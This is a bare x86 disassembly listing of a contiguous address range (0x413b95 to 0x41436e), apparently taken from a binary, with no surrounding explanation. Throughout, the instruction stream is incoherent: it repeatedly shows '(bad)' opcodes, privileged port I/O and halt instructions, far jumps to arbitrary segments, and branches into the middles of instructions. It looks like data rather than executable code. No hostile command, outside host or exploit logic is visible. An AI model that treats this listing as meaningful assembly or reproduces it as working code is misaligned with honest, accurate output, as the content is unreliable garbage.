  413b95:	adc    WORD PTR [eax],si
  413b98:	mov    esi,0xb44a4ad3
  413b9d:	es int 0xea
  413ba0:	mov    WORD PTR [eax+0x2],ss
  413ba3:	in     al,0x95
  413ba5:	rcr    DWORD PTR [esi],1
  413ba7:	jb     0x413b2c
  413ba9:	das    
  413baa:	cmp    al,0xd
  413bac:	in     eax,0x95
  413bae:	mov    esi,0x435fb4f8
  413bb3:	fdivr  st,st(4)
  413bb5:	and    ah,BYTE PTR [edx+0x446debfb]
  413bbb:	push   ebx
  413bbc:	shl    dl,1
  413bbe:	xchg   edi,eax
  413bbf:	fiadd  DWORD PTR [eax-0x77b4a9cf]
  413bc5:	sbb    DWORD PTR [esi+eax*1],eax
  413bc8:	gs xchg esp,eax
  413bca:	or     BYTE PTR [edi-0x6abd8a5b],0x94
  413bd1:	stos   BYTE PTR es:[edi],al
  413bd2:	sti    
  413bd3:	jmp    0x413baa
  413bd5:	or     bh,bl
  413bd7:	out    dx,eax
  413bd8:	repz push ebp
  413bda:	in     al,0x36
  413bdc:	dec    DWORD PTR [esp+esi*2]
  413bdf:	adc    eax,0x984ad100
  413be4:	and    BYTE PTR [ebp-0x18e605c7],0x12
  413beb:	sbb    BYTE PTR [edi+0x718bf898],ah
  413bf1:	pop    edx
  413bf2:	cmp    dl,BYTE PTR [ecx+0x596fc971]
  413bf8:	or     al,0x65
  413bfa:	ss je  0x413c53
  413bfd:	shl    ebp,cl
  413bff:	mov    esi,0x8e13362f
  413c04:	or     BYTE PTR [ebp-0x3df183a5],0x56
  413c0b:	dec    ebx
  413c0c:	sbb    eax,0xc2583284
  413c11:	or     BYTE PTR [esi+edi*4-0x1e9b921c],cl
  413c18:	fs pop edx
  413c1a:	rol    al,cl
  413c1c:	xor    dh,BYTE PTR [eax+0x571ee287]
  413c22:	das    
  413c23:	pop    ebp
  413c24:	cli    
  413c25:	mov    ah,0xe8
  413c27:	imul   ah
  413c29:	clc    
  413c2a:	xchg   esp,eax
  413c2b:	mov    BYTE PTR [ebp+0x24526552],bh
  413c31:	xchg   edx,eax
  413c32:	outs   dx,BYTE PTR ds:[esi]
  413c33:	in     al,0xc7
  413c35:	dec    ebp
  413c36:	mov    fs,WORD PTR [edx]
  413c38:	sbb    al,0x45
  413c3a:	or     DWORD PTR [esi],esp
  413c3c:	xchg   edx,eax
  413c3d:	ja     0x413ca6
  413c3f:	popa   
  413c40:	add    DWORD PTR [edi],ebp
  413c42:	les    ebx,FWORD PTR [esi-0x3f]
  413c45:	aad    0x24
  413c47:	or     ebx,ebp
  413c49:	addr16 sbb eax,0x77383bbc
  413c4f:	enter  0xe786,0x2d
  413c53:	cmp    BYTE PTR [ebx],dl
  413c55:	aaa    
  413c56:	mov    ds:0x439c4893,al
  413c5b:	pop    esp
  413c5c:	pop    ss
  413c5d:	sbb    DWORD PTR [ebx+0x85ef418],0x4a
  413c64:	scas   eax,DWORD PTR es:[edi]
  413c65:	into   
  413c66:	sbb    cl,ch
  413c68:	sbb    bh,BYTE PTR [edi-0x3c]
  413c6b:	ss and eax,0x17b56da5
  413c71:	out    0xc9,al
  413c73:	enter  0x364,0x55
  413c77:	mov    WORD PTR [edi-0x5d],cs
  413c7a:	data16 or ch,dl
  413c7d:	gs jmp 0xf84c8810
  413c83:	out    0x26,al
  413c85:	add    edi,DWORD PTR [eax+0x64]
  413c88:	hlt    
  413c89:	std    
  413c8a:	cmp    BYTE PTR [ebx],dh
  413c8c:	outs   dx,DWORD PTR ds:[esi]
  413c8d:	jg     0x413d08
  413c8f:	call   0x27e6:0x41178380
  413c96:	mov    dl,0xeb
  413c98:	(bad)  
  413c99:	cli    
  413c9a:	cmc    
  413c9b:	or     al,0x8e
  413c9d:	dec    esi
  413c9e:	mov    ecx,0x9413029a
  413ca3:	xchg   esp,eax
  413ca4:	and    eax,DWORD PTR [ebp-0x4]
  413ca7:	rcr    eax,1
  413ca9:	loopne 0x413d2a
  413cab:	lea    eax,[ecx+edi*1+0x7b4330bf]
  413cb2:	add    eax,0x72dc21b3
  413cb7:	adc    DWORD PTR [edi+0x8],ebp
  413cba:	and    eax,0x760d426c
  413cbf:	sbb    DWORD PTR [esi+0x3e],0xffffffb4
  413cc3:	imul   ecx,eax,0xffffff8a
  413cc6:	pop    es
  413cc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cc8:	(bad)
  413ccb:	js     0x413ca5
  413ccd:	rcl    DWORD PTR [esp+eax*1-0x6b5b7d57],cl
  413cd4:	imul   esi,DWORD PTR [edi],0xfe408107
  413cda:	imul   edx,DWORD PTR [esi+edx*8-0x31],0x3bc07bd3
  413ce2:	cmp    eax,DWORD PTR [ebp-0x1f]
  413ce5:	inc    esi
  413ce6:	jo     0x413d11
  413ce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ce9:	and    BYTE PTR [edx],dh
  413ceb:	mov    eax,0xe22de145
  413cf0:	mov    edx,0x5fcc4413
  413cf5:	sub    DWORD PTR [eax+0x271c96a1],eax
  413cfb:	mov    ah,0x9a
  413cfd:	lea    edx,[ebp+0x39fbb332]
  413d03:	xchg   esp,eax
  413d04:	(bad)  
  413d05:	mov    edx,0x62152e41
  413d0a:	lahf   
  413d0b:	imul   ecx,DWORD PTR [edi],0x65
  413d0e:	pop    eax
  413d0f:	mov    gs,WORD PTR [edx+0x482f0187]
  413d15:	popf   
  413d16:	imul   eax
  413d18:	rcr    BYTE PTR [ecx+edx*4],cl
  413d1b:	mov    ds:0x6001eee8,eax
  413d20:	leave  
  413d21:	add    al,ch
  413d23:	or     BYTE PTR [eax+ecx*2+0x31],dh
  413d27:	cdq    
  413d28:	rol    DWORD PTR [ecx+edi*1-0x7a],cl
  413d2c:	(bad)  
  413d2d:	sub    dh,dh
  413d2f:	mov    BYTE PTR [ebp+0x67],ah
  413d32:	outs   dx,BYTE PTR ds:[esi]
  413d33:	mov    DWORD PTR [edi+0x5f45e38d],0x5196deeb
  413d3d:	aaa    
  413d3e:	sbb    al,BYTE PTR [edi+0x448e7839]
  413d44:	hlt    
  413d45:	add    al,0x62
  413d47:	leave  
  413d48:	mov    ah,0x2b
  413d4a:	push   eax
  413d4b:	mov    dh,0x61
  413d4d:	and    DWORD PTR [edx+0x647c08b1],ebp
  413d53:	mov    esp,0xfcebdaf9
  413d58:	sbb    al,dh
  413d5a:	sub    BYTE PTR [edi+0x47],0x2
  413d5e:	(bad)  
  413d5f:	out    0x65,al
  413d61:	mov    dl,0xb0
  413d63:	int3   
  413d64:	add    esp,ebx
  413d66:	js     0x413d41
  413d68:	pushf  
  413d69:	mov    edx,0xfab0d9db
  413d6e:	mov    ch,0x2d
  413d70:	jecxz  0x413d94
  413d72:	popa   
  413d73:	or     al,bl
  413d75:	fdiv   QWORD PTR [ecx-0x6f]
  413d78:	sub    bh,BYTE PTR [ecx+0x4e]
  413d7b:	int3   
  413d7c:	jb     0x413d5a
  413d7e:	dec    esp
  413d7f:	push   edx
  413d80:	push   edx
  413d81:	stos   BYTE PTR es:[edi],al
  413d82:	mov    bl,0x18
  413d84:	push   ss
  413d85:	push   ds
  413d86:	sub    al,0x8
  413d88:	cmp    eax,0x14f987c0
  413d8d:	cmp    eax,0x9a2d3117
  413d92:	int    0x29
  413d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d95:	adc    al,0xd0
  413d97:	sbb    edi,DWORD PTR [ebx+0x64]
  413d9a:	sbb    DWORD PTR [eax],ebx
  413d9c:	test   eax,0x1ccb6d65
  413da1:	sub    esi,esi
  413da3:	or     dh,BYTE PTR [eax+0x29]
  413da6:	out    dx,al
  413da7:	popf   
  413da8:	push   ebx
  413da9:	addr16 jb 0x413ded
  413dac:	(bad)  
  413dad:	push   ebx
  413dae:	dec    ecx
  413daf:	push   ss
  413db0:	dec    edi
  413db1:	lahf   
  413db2:	mov    bh,0xb6
  413db4:	repz pop edi
  413db6:	(bad)
  413dbc:	int    0xb5
  413dbe:	scas   eax,DWORD PTR es:[edi]
  413dbf:	iret   
  413dc0:	imul   BYTE PTR [edi+ebx*8-0x8f03d19]
  413dc7:	add    al,0x29
  413dc9:	sahf   
  413dca:	or     ah,BYTE PTR ss:[ecx-0x61f8f82c]
  413dd1:	mov    edx,0xbfdf1af9
  413dd6:	js     0x413d59
  413dd8:	mov    BYTE PTR [ebx+edx*8],bh
  413ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ddc:	xchg   esp,eax
  413ddd:	(bad)  
  413dde:	fidivr WORD PTR [esi-0xbca3c66]
  413de4:	or     eax,0xabdedd1f
  413de9:	mov    bh,0x90
  413deb:	mov    dl,0xd6
  413ded:	test   eax,0xaf3e4496
  413df2:	shl    al,1
  413df4:	inc    ecx
  413df5:	push   ebx
  413df6:	adc    eax,0x8b208554
  413dfb:	push   DWORD PTR cs:[ebp+0x5e219122]
  413e02:	adc    eax,0xfac7026
  413e07:	xor    ebp,edi
  413e09:	jecxz  0x413e56
  413e0b:	shr    DWORD PTR [edx+0x32],0x5
  413e0f:	cwde   
  413e10:	jbe    0x413dfc
  413e12:	scas   al,BYTE PTR es:[edi]
  413e13:	je     0x413dfa
  413e15:	xchg   ebp,eax
  413e16:	mov    al,ds:0x911185e1
  413e1b:	cmp    BYTE PTR [edx],bh
  413e1d:	in     al,0x98
  413e1f:	daa    
  413e20:	add    bl,BYTE PTR [edi+0x1a]
  413e23:	scas   eax,DWORD PTR es:[edi]
  413e24:	mov    DWORD PTR [ecx],edi
  413e26:	push   0xffffffcc
  413e28:	sbb    DWORD PTR [eax+0x2e],esp
  413e2b:	test   ch,al
  413e2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e2e:	adc    esi,ebp
  413e30:	mov    BYTE PTR [eax],cl
  413e32:	xchg   edi,eax
  413e33:	sbb    bl,BYTE PTR [ecx+0x44]
  413e36:	das    
  413e37:	in     eax,0xb6
  413e39:	add    eax,0x62a84474
  413e3e:	and    DWORD PTR [edx-0x5cead00b],ecx
  413e44:	call   0x4d23:0xae5811b5
  413e4b:	or     DWORD PTR [eax],edx
  413e4d:	pop    edx
  413e4e:	arpl   bx,bp
  413e50:	aaa    
  413e51:	cmp    eax,0x644a60f2
  413e56:	ss cwde 
  413e58:	mov    ebx,0xe2841236
  413e5d:	out    dx,al
  413e5e:	les    ebp,FWORD PTR [ecx+0x2319622f]
  413e64:	mov    eax,0xd1cbb1d4
  413e69:	add    ch,al
  413e6b:	dec    esi
  413e6c:	daa    
  413e6d:	pop    ecx
  413e6e:	lock sbb edi,esp
  413e71:	cmp    DWORD PTR [ebx],esp
  413e73:	pop    es
  413e74:	dec    edx
  413e75:	pop    ebx
  413e76:	pop    ds
  413e77:	push   ss
  413e78:	inc    ebp
  413e79:	jmp    0x1b0e:0x6c4c1146
  413e80:	inc    eax
  413e81:	test   DWORD PTR [ecx],edi
  413e83:	(bad)  
  413e84:	cmp    al,0xc8
  413e86:	dec    esi
  413e87:	push   0x1b
  413e89:	or     al,0x3b
  413e8b:	push   es
  413e8c:	ret    
  413e8d:	mov    WORD PTR [ebp+edx*4+0x3d],cs
  413e91:	lock xor bl,bl
  413e94:	push   eax
  413e95:	sub    ch,dl
  413e97:	mov    esi,0x4a9167fc
  413e9c:	cmc    
  413e9d:	mov    dh,0x8b
  413e9f:	loop   0x413ec5
  413ea1:	outs   dx,DWORD PTR ds:[esi]
  413ea2:	push   ds
  413ea3:	pusha  
  413ea4:	xor    DWORD PTR [esi+0x0],edx
  413ea7:	xchg   esp,eax
  413ea8:	in     eax,dx
  413ea9:	adc    al,0x6c
  413eab:	outs   dx,DWORD PTR ds:[esi]
  413eac:	dec    ecx
  413ead:	lahf   
  413eae:	sub    BYTE PTR [eax-0x4addc14a],0xbf
  413eb5:	mov    ah,BYTE PTR [eax]
  413eb7:	out    dx,eax
  413eb8:	cli    
  413eb9:	xchg   esp,eax
  413eba:	gs cli 
  413ebc:	ds inc ebx
  413ebe:	xor    esi,ebp
  413ec0:	imul   edi,DWORD PTR [ecx+0x22],0x3
  413ec4:	pop    ss
  413ec5:	push   ds
  413ec6:	jmp    0x62963ce9
  413ecb:	fwait
  413ecc:	sub    eax,0x7398c59f
  413ed1:	in     al,0xce
  413ed3:	test   BYTE PTR [eax-0x5f],ah
  413ed6:	cmp    BYTE PTR [ebx-0x7bec3940],0xbc
  413edd:	out    0x18,al
  413edf:	fwait
  413ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ee1:	ret    
  413ee2:	fxch   st(0)
  413ee4:	cmp    eax,0x58a484cc
  413ee9:	sub    DWORD PTR [eax+0x66],edi
  413eec:	dec    esp
  413eed:	add    eax,0x33e4f309
  413ef2:	ins    BYTE PTR es:[edi],dx
  413ef3:	or     al,0xaf
  413ef5:	xchg   ebx,eax
  413ef6:	leave  
  413ef7:	popf   
  413ef8:	xchg   esi,eax
  413ef9:	gs jmp 0x5d30:0x79a199a2
  413f01:	jge    0x413eb3
  413f03:	ins    BYTE PTR es:[edi],dx
  413f04:	xor    DWORD PTR ss:[edi-0x731b5337],ebx
  413f0b:	stos   BYTE PTR es:[edi],al
  413f0c:	xor    eax,0x34bd319c
  413f11:	adc    ebp,DWORD PTR [ecx+0x50]
  413f14:	sbb    DWORD PTR [ecx],0x51cfd6f
  413f1a:	xor    eax,0x5b25f459
  413f1f:	sahf   
  413f20:	fiadd  DWORD PTR [eax]
  413f22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f23:	jl     0x413fa0
  413f25:	push   ss
  413f26:	pusha  
  413f27:	jle    0x413ec0
  413f29:	cmp    al,0xb9
  413f2b:	in     eax,0xc2
  413f2d:	ds or  al,0x60
  413f30:	mov    dl,0xb6
  413f32:	dec    ebx
  413f33:	fbld   TBYTE PTR [ecx]
  413f35:	cs pushf 
  413f37:	hlt    
  413f38:	mov    dl,al
  413f3a:	in     al,dx
  413f3b:	push   0xfffffff0
  413f3d:	ja     0x413f34
  413f3f:	retf   0x25c0
  413f42:	mov    ebp,0x70ceb258
  413f47:	imul   DWORD PTR [ecx]
  413f49:	out    dx,eax
  413f4a:	sbb    al,0x32
  413f4c:	cmp    BYTE PTR [eax],al
  413f4e:	mov    ch,0x26
  413f50:	xor    cl,BYTE PTR [eax]
  413f52:	mov    DWORD PTR ds:0xa93c0519,esi
  413f58:	addr16 cwde 
  413f5a:	rcl    DWORD PTR [edi-0x27],1
  413f5d:	cmp    BYTE PTR ds:0x62e66b54,bh
  413f63:	fcmovb st,st(3)
  413f65:	mov    edi,0xbb9c8d2e
  413f6a:	das    
  413f6b:	push   ebp
  413f6c:	into   
  413f6d:	in     al,dx
  413f6e:	popa   
  413f6f:	loopne 0x413f9a
  413f71:	mov    bh,0xa7
  413f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f74:	jle    0x413f3f
  413f76:	push   ebp
  413f77:	shl    BYTE PTR [ebx-0x74],0x5b
  413f7b:	pop    esp
  413f7c:	and    eax,0xac10d1bf
  413f81:	sete   BYTE PTR [esi-0x25]
  413f85:	jae    0x413fde
  413f87:	(bad)  
  413f89:	lahf   
  413f8a:	cmp    ch,cl
  413f8c:	sub    edx,DWORD PTR [ebp-0x26]
  413f8f:	out    dx,al
  413f90:	imul   ebp,DWORD PTR [edi+0x1626402a],0x0
  413f97:	add    eax,0xc3c220d9
  413f9c:	sti    
  413f9d:	add    esi,DWORD PTR [edi+0x1b]
  413fa0:	outs   dx,DWORD PTR ds:[esi]
  413fa1:	call   0xe117:0xda334152
  413fa8:	aas    
  413fa9:	pop    edi
  413faa:	idiv   edx
  413fac:	in     eax,dx
  413fad:	out    dx,eax
  413fae:	std    
  413faf:	push   ebx
  413fb0:	lods   al,BYTE PTR ds:[esi]
  413fb1:	mov    BYTE PTR [esp+esi*8+0x2d],ch
  413fb5:	out    dx,al
  413fb6:	mov    ebp,0xfbb40491
  413fbb:	pop    eax
  413fbc:	and    BYTE PTR [ecx-0x79],0xb1
  413fc0:	shl    al,0xb4
  413fc3:	(bad)  
  413fc4:	mov    edi,0x8bbfe6ef
  413fc9:	jae    0x413f84
  413fcb:	cs jecxz 0x413fb3
  413fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fcf:	(bad)  
  413fd0:	sbb    eax,0x9981ae72
  413fd5:	pop    esp
  413fd6:	lahf   
  413fd7:	mov    ecx,0x3ee94049
  413fdc:	clc    
  413fdd:	lods   al,BYTE PTR ds:[esi]
  413fde:	xchg   ebp,eax
  413fdf:	dec    edi
  413fe0:	fs out 0x4d,eax
  413fe3:	es pop eax
  413fe5:	gs cld 
  413fe7:	jo     0x414052
  413fe9:	mov    eax,DWORD PTR [esi-0x73b80e3a]
  413fef:	shr    DWORD PTR [edi-0x65],1
  413ff2:	mov    bl,0x72
  413ff4:	mov    dh,0xe5
  413ff6:	mov    ah,0x55
  413ff8:	mov    DWORD PTR [esi],esp
  413ffa:	adc    ecx,DWORD PTR [edx-0x6f]
  413ffd:	iret   
  413ffe:	jo     0x413ff6
  414000:	data16 (bad) 
  414002:	sub    al,0x5a
  414004:	and    BYTE PTR [ebp+0x565abbd6],bl
  41400a:	adc    eax,0xeb33da95
  41400f:	pop    ebp
  414010:	aam    0xad
  414012:	xor    DWORD PTR [ecx+0x4d],ecx
  414015:	shr    BYTE PTR [esi-0x12ab87f1],cl
  41401b:	dec    edx
  41401c:	xor    eax,0xd0bb173c
  414021:	jmp    0xb03:0xda69aa1b
  414028:	push   cs
  414029:	cdq    
  41402a:	addr16 sbb eax,0xcf84a2a9
  414030:	sbb    eax,0xdc77b855
  414035:	sub    DWORD PTR [ebp-0x563c1ed4],esi
  41403b:	ficom  WORD PTR [ebx+0x72a5b3f3]
  414041:	mov    bh,0xf7
  414043:	in     al,0xfb
  414045:	lods   al,BYTE PTR ds:[esi]
  414046:	in     al,dx
  414047:	adc    ah,0x12
  41404a:	mov    al,BYTE PTR [esi-0x494c13ce]
  414050:	pushf  
  414051:	or     BYTE PTR [edi-0x53],0xff
  414055:	pop    esi
  414056:	jg     0x414056
  414058:	sub    DWORD PTR [edi+ebx*2+0x5f],ecx
  41405c:	aad    0xbe
  41405e:	dec    ecx
  41405f:	jecxz  0x414031
  414061:	mov    ebp,0x9d5f1995
  414066:	adc    cl,BYTE PTR [eax-0x32]
  414069:	dec    eax
  41406a:	hlt    
  41406b:	mov    ecx,0x7daac1b5
  414070:	xchg   ecx,eax
  414071:	clc    
  414072:	iret   
  414073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414074:	out    0xe9,eax
  414076:	or     ecx,edx
  414078:	sbb    al,0xbe
  41407a:	adc    al,0x5e
  41407c:	mov    eax,0x682bb290
  414081:	mov    gs,WORD PTR [eax-0x14]
  414084:	shl    BYTE PTR [ecx+ebp*4-0x75ed40c5],1
  41408b:	test   BYTE PTR [esi+0x687dd5fd],dh
  414091:	repnz cli 
  414093:	dec    edi
  414094:	(bad)  
  414095:	adc    BYTE PTR [ebx+0xd],al
  414098:	inc    eax
  414099:	adc    dh,BYTE PTR [esi+0x22]
  41409c:	fwait
  41409d:	call   0x4403be40
  4140a2:	push   ebp
  4140a3:	cmp    eax,0x6b59f3fa
  4140a8:	loopne 0x4140e6
  4140aa:	sbb    al,0xdb
  4140ac:	add    cl,cl
  4140ae:	rcl    BYTE PTR [edx],1
  4140b0:	bound  eax,QWORD PTR [edi-0x7fc54739]
  4140b6:	lock lds ecx,FWORD PTR [edi+0x39e90165]
  4140bd:	sbb    DWORD PTR [ebx],ebx
  4140bf:	pop    ss
  4140c0:	lds    ebx,FWORD PTR [eax+ecx*8]
  4140c3:	pop    ecx
  4140c4:	pusha  
  4140c5:	pop    edi
  4140c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140c7:	imul   edi,DWORD PTR [eax+0x62],0x5eaeea50
  4140ce:	add    BYTE PTR [edx],0xe1
  4140d1:	inc    esi
  4140d2:	adc    ebx,DWORD PTR [ebx+ebx*1+0x7b]
  4140d6:	mov    cl,0xe6
  4140d8:	aas    
  4140d9:	jmpw   0x8b16
  4140dd:	xor    ebx,DWORD PTR [esp+esi*1]
  4140e0:	xor    esp,DWORD PTR [edx+esi*8-0x55]
  4140e4:	rcr    edi,1
  4140e6:	mov    al,ds:0x20eab96a
  4140eb:	xlat   BYTE PTR ds:[ebx]
  4140ec:	sbb    ebx,edi
  4140ee:	and    al,0xcc
  4140f0:	not    DWORD PTR [ebx+0x39c44e6d]
  4140f6:	icebp  
  4140f7:	cmp    dl,BYTE PTR [edx+eax*8]
  4140fa:	mov    ecx,0x41650637
  4140ff:	packuswb mm3,QWORD PTR [edx]
  414102:	jae    0x414090
  414104:	dec    esp
  414105:	stc    
  414106:	jb     0x414123
  414108:	retf   0x2b3b
  41410b:	repnz ror edi,cl
  41410e:	call   0xafe5:0xd3a59236
  414115:	jmp    0x76f8:0xedc61c10
  41411c:	jns    0x414135
  41411e:	xchg   esi,eax
  41411f:	lock mov bh,0x3e
  414122:	cdq    
  414123:	jle    0x4140e1
  414125:	rcr    BYTE PTR cs:[esi-0x56],0x7b
  41412a:	es pop eax
  41412c:	out    dx,al
  41412d:	mov    al,0x1
  41412f:	or     BYTE PTR [eax+0x1b],dl
  414132:	jnp    0x4141b0
  414134:	jne    0x414129
  414136:	push   0xffffffcd
  414138:	ins    DWORD PTR es:[edi],dx
  414139:	jp     0x4141ae
  41413b:	xor    bl,bl
  41413d:	std    
  41413e:	adc    DWORD PTR [ebx-0x131ff379],ebx
  414144:	test   al,0xb6
  414146:	(bad)  
  414148:	or     DWORD PTR [eax+eax*1+0x7a],eax
  41414c:	sbb    eax,0x8beeaa72
  414151:	sub    DWORD PTR [esi+0x13779f4e],edx
  414157:	aaa    
  414158:	dec    edx
  414159:	out    dx,eax
  41415a:	sahf   
  41415b:	cmc    
  41415c:	ss or  al,0x34
  41415f:	push   ds
  414160:	jno    0x414134
  414162:	or     bl,ah
  414164:	add    ebx,ebx
  414166:	icebp  
  414167:	sbb    ebx,DWORD PTR [edi]
  414169:	xor    dh,BYTE PTR [ebx]
  41416b:	pop    edi
  41416c:	sbb    esi,DWORD PTR [edx+0xfd51422]
  414172:	ficomp WORD PTR [eax]
  414174:	mov    ds:0xadd34711,al
  414179:	push   esp
  41417a:	or     edx,edi
  41417c:	or     BYTE PTR [ebx-0x2c],cl
  41417f:	xchg   esp,eax
  414180:	mov    bh,0x5c
  414182:	arpl   WORD PTR [esi-0x19],di
  414185:	xchg   DWORD PTR [edx],ecx
  414187:	and    al,0xb1
  414189:	adc    eax,0x22c67ef1
  41418e:	pop    ds
  41418f:	xor    eax,0x44e429cb
  414194:	(bad)  
  414195:	jne    0x414137
  414197:	inc    edi
  414198:	adc    eax,0x29203fe0
  41419d:	push   0x3cf7a6c5
  4141a2:	push   ebp
  4141a3:	nop
  4141a4:	xchg   BYTE PTR [ebx-0x21],al
  4141a7:	mov    ah,bl
  4141a9:	mov    ebx,0xf26ac7ed
  4141ae:	mov    ebx,0xb250db37
  4141b3:	sub    eax,ecx
  4141b5:	mov    BYTE PTR [ebp-0x49],al
  4141b8:	sti    
  4141b9:	and    eax,0xcbdcb4b0
  4141be:	push   0xe51849f6
  4141c3:	data16 in al,0x9f
  4141c6:	inc    esp
  4141c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141c8:	gs jge 0x414245
  4141cb:	and    DWORD PTR [edi+0x2e],0xffffff95
  4141cf:	add    edx,ecx
  4141d1:	call   0xb0ba5e59
  4141d6:	cwde   
  4141d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141d8:	(bad)  
  4141d9:	xchg   esi,eax
  4141da:	fnstenv [ebx]
  4141dc:	inc    ecx
  4141dd:	pushf  
  4141de:	xchg   bl,ch
  4141e0:	stos   BYTE PTR es:[edi],al
  4141e1:	js     0x4141cc
  4141e3:	ds (bad) 
  4141e5:	sar    dh,1
  4141e7:	mov    al,BYTE PTR [ebx-0x648e4659]
  4141ed:	mov    ds:0xf9f4aa87,al
  4141f2:	ins    DWORD PTR es:[edi],dx
  4141f3:	in     eax,0x65
  4141f5:	jbe    0x41423f
  4141f7:	(bad)  
  4141f8:	xlat   BYTE PTR ds:[ebx]
  4141f9:	or     DWORD PTR [edx-0x60e8ef41],0x22
  414200:	sub    eax,0xb269f7ef
  414205:	xor    dh,bh
  414207:	cmp    BYTE PTR [edi-0x39b7325f],ah
  41420d:	cmc    
  41420e:	sti    
  41420f:	jb     0x4141e7
  414211:	icebp  
  414212:	or     BYTE PTR [ecx-0x176a47bf],cl
  414218:	loopne 0x414264
  41421a:	popf   
  41421b:	push   ecx
  41421c:	(bad)  
  41421d:	aam    0x79
  41421f:	loop   0x4141e8
  414221:	push   0xa666499
  414226:	sysenter 
  414228:	dec    eax
  414229:	or     DWORD PTR [edx+0x7bddebd],esp
  41422f:	push   ebp
  414230:	inc    ebx
  414231:	mov    bl,ah
  414233:	ret    0x159d
  414236:	mov    cs,WORD PTR [ebp-0x24]
  414239:	iret   
  41423a:	fstp   QWORD PTR ds:0x8789f790
  414240:	push   edi
  414241:	sbb    eax,DWORD PTR [edx]
  414243:	fisubr WORD PTR [edx+0x46]
  414246:	arpl   WORD PTR [edi-0x32],sp
  414249:	pop    edi
  41424a:	xor    ah,BYTE PTR [ecx-0x558f4733]
  414250:	ret    
  414251:	mov    cl,0x12
  414253:	nop
  414254:	or     dh,BYTE PTR [edi+0x33]
  414257:	jo     0x4141fd
  414259:	jmp    0xabe98b82
  41425e:	sbb    eax,0x860bce92
  414263:	shr    DWORD PTR ds:0x12fb950e,cl
  414269:	stos   DWORD PTR es:[edi],eax
  41426a:	dec    eax
  41426b:	daa    
  41426c:	jecxz  0x4142b7
  41426e:	pop    edx
  41426f:	adc    eax,0x3d3ceea
  414274:	push   eax
  414275:	outs   dx,BYTE PTR ds:[esi]
  414276:	lods   al,BYTE PTR ds:[esi]
  414277:	jnp    0x41424c
  414279:	mov    WORD PTR [ecx],ds
  41427b:	push   0x9d15a2e
  414280:	(bad)  
  414281:	stos   DWORD PTR es:[edi],eax
  414282:	mov    bh,0xfa
  414284:	jne    0x414296
  414286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414287:	jne    0x4142eb
  414289:	inc    edx
  41428a:	push   0xb06b6f2d
  41428f:	sbb    al,0xd3
  414291:	and    ebx,esp
  414293:	nop
  414294:	repnz push ebp
  414296:	add    eax,0x191d2f99
  41429b:	dec    eax
  41429c:	cmp    esp,ebp
  41429e:	lds    esi,FWORD PTR [edi+0x1d]
  4142a1:	je     0x414256
  4142a3:	test   eax,0xf1faa4ce
  4142a8:	xor    BYTE PTR [edi],ah
  4142aa:	sub    bl,bl
  4142ac:	test   cl,ah
  4142ae:	inc    esi
  4142af:	in     eax,dx
  4142b0:	ds leave 
  4142b2:	jmp    DWORD PTR [edx]
  4142b4:	cli    
  4142b5:	or     DWORD PTR [esi],esp
  4142b7:	adc    al,0x3c
  4142b9:	sti    
  4142ba:	pop    eax
  4142bb:	ret    0x8718
  4142be:	ins    DWORD PTR es:[edi],dx
  4142bf:	sub    ecx,DWORD PTR [ecx+0x6a]
  4142c2:	iret   
  4142c3:	dec    esi
  4142c4:	fwait
  4142c5:	jge    0x414264
  4142c7:	xor    eax,0x4ec5aef3
  4142cc:	and    ah,al
  4142ce:	jno    0x4142de
  4142d0:	jmp    0x4142b9
  4142d2:	jg     0x4142c4
  4142d4:	mov    edx,0x7b2dc3c1
  4142d9:	cmp    DWORD PTR [esi*4-0x170f933],esi
  4142e0:	mov    ch,0xe
  4142e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142e3:	sub    eax,0xc4ff9bc5
  4142e8:	xor    eax,0xafb89cbb
  4142ed:	cmp    eax,0x5c5c8c32
  4142f2:	inc    eax
  4142f3:	or     BYTE PTR [edx-0x2f2b1702],0xcc
  4142fa:	test   al,0x6d
  4142fc:	retf   0x1e61
  4142ff:	dec    ebp
  414300:	mov    eax,0x590010a6
  414305:	(bad)  
  414306:	lods   al,BYTE PTR ds:[esi]
  414307:	jno    0x41432f
  414309:	dec    edx
  41430a:	mov    ah,0xfe
  41430c:	pushf  
  41430d:	xlat   BYTE PTR ds:[ebx]
  41430e:	lahf   
  41430f:	xchg   edx,eax
  414310:	iret   
  414311:	mov    ch,0x7e
  414313:	inc    ecx
  414314:	(bad)
  414317:	inc    ebp
  414318:	out    dx,al
  414319:	inc    edi
  41431a:	in     eax,dx
  41431b:	sar    BYTE PTR [eax-0x35],1
  41431e:	cmp    edi,DWORD PTR [eax-0x1d]
  414321:	test   ch,bh
  414323:	loopne 0x41434e
  414325:	into   
  414326:	cmp    bl,0xbf
  414329:	add    ch,BYTE PTR [esi+0x2392312]
  41432f:	push   edi
  414330:	adc    cl,dl
  414332:	xor    al,BYTE PTR [eax+0x7b5c8aa7]
  414338:	jmp    0x414302
  41433a:	mov    bl,0x20
  41433c:	push   eax
  41433d:	pxor   mm0,QWORD PTR [ecx+0x54]
  414341:	aam    0xca
  414343:	xchg   esi,eax
  414344:	hlt    
  414345:	add    DWORD PTR [eax+ebx*2+0x7bd68ef5],eax
  41434c:	sub    esi,DWORD PTR [edi-0x4]
  41434f:	cmp    ah,0x2d
  414352:	push   edi
  414353:	div    BYTE PTR [edx]
  414355:	shr    ebp,cl
  414357:	jno    0x414373
  414359:	sbb    DWORD PTR [edx],0x6614f1fe
  41435f:	push   edx
  414360:	ret    
  414361:	xchg   ebp,eax
  414362:	add    bh,BYTE PTR [ebp+0x7b]
  414365:	jno    0x4142f1
  414367:	mov    eax,0xd26516aa
  41436c:	xor    al,0xa7
  41436e:	and    ch,dl
